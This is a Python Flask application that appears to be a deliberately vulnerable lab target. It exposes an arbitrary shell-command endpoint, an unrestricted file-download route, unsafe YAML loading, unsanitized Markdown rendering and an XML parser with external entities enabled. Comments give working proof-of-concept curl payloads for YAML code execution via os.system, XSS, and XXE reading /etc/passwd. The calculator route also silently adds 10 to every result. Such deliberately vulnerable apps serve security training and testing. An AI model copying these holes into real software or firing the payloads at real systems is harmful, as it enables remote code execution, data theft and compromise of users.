import os
import subprocess
from flask import Flask, request, jsonify, render_template, send_file
from pathlib import Path
import yaml
import markdown
from markupsafe import Markup
from lxml import etree

app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False

FILES = {
    '1': '1',
    '2': '2',
    '3': '3',
    '4': '4',
    '5': '5'
}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/calculate', methods=['POST'])
def calculate():
    data = request.json
    num1 = data.get('num1')
    num2 = data.get('num2')
    operator = data.get('operator')

    if not num1 or not num2 or not operator:
        return jsonify({"error": "num1, num2, and operator are required."}), 400

    try:
        num1 = float(num1)
        num2 = float(num2)
    except ValueError:
        return jsonify({"error": "You must enter numbers."}), 400

    if operator == '+':
        result = num1 + num2
    elif operator == '-':
        result = num1 - num2
    elif operator == '*':
        result = num1 * num2
    elif operator == '/':
        if num2 == 0:
            return jsonify({"error": "Cannot divide by zero."}), 400
        result = num1 / num2
    else:
        return jsonify({"error": "Unsupported operator."}), 400

    return jsonify({"result": result + 10})

def execute_command(command):
    """Execute the given command using subprocess."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return {"result": result.stdout}
        else:
            return {"error": result.stderr}, 400
    except Exception as e:
        return {"error": str(e)}, 400

@app.route('/run-command', methods=['GET'])
def run_command():
    command = request.args.get('command')

    if not command:
        return jsonify({"error": "No command provided."}), 400

    return jsonify(execute_command(command))

@app.route('/download-file', methods=['GET'])
def download_file_endpoint():
    file_id = request.args.get('file_id')

    if file_id in FILES:
        file_path = os.path.join(os.getcwd(), 'file', FILES[file_id])
        return download_file_via_path(file_path)
    
    else:
        file_path = Path(file_id)
        return download_file_via_path(file_path)

    return jsonify({"error": "Please provide a valid file ID or path."}), 400

def download_file_via_path(file_path):
    try:
        return send_file(file_path, as_attachment=True)
    except FileNotFoundError:
        return jsonify({"error": "File not found."}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 400

# PyYAML == 5.3
# POC : curl "http://127.0.0.1/yaml?data=%21%21python%2Fobject%2Fapply%3Aos.system%20%5B%22touch%20test_file.txt%22%5D"    
@app.route('/yaml', methods=['GET'])
def vulnerable_yaml():
    yaml_data = request.args.get('data')  
    try:
        data = yaml.load(yaml_data, Loader=yaml.Loader)
        return jsonify({"message": "YAML parsed successfully", "content": data})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

# markdown == 3.1.1
# POC : curl "http://127.0.0.1/markdown?content=<script>alert('XSS')</script>"
@app.route('/markdown', methods=['GET'])
def vulnerable_markdown():
    content = request.args.get('content', '')
    html_output = markdown.markdown(content)
    return Markup(html_output)

# lxml
# POC : curl "http://127.0.0.1/parse_xml?data=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE+root+%5B%0A++%3C%21ELEMENT+root+ANY+%3E%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22+%3E%5D%3E%0A%3Croot%3E%26xxe%3B%3C%2Froot%3E"
@app.route('/parse_xml', methods=['GET'])
def parse_xml():
    try:
        xml_data = request.args.get('data', '')
        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
        root = etree.fromstring(xml_data.encode('utf-8'), parser)
        root_content = etree.tostring(root, pretty_print=True).decode('utf-8')
        return jsonify({'message': 'XML parsed successfully', 'root_tag': root.tag, 'content': root_content}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(debug=True, port=80)
